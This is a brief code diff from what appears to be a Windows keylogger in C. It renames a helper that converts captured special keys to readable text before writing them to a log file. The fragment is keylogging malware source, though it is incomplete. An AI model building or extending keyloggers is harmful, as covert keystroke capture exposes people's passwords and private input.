@@ -45,7 +45,7 @@ void windows_keylog(const char* filePath) {
                 int isSpecialKey = CheckSpecialKey(key);
                 if (isSpecialKey) {
                     // Convert special key into readable key
-                    char *specialKey = windows_SpecialKeyToReadable(key);
+                    char *specialKey = SpecialKeyToReadable(key);
                     if (specialKey != NULL) {
                         WriteSpecialKeyIntoFile(specialKey, filePath);
                     }
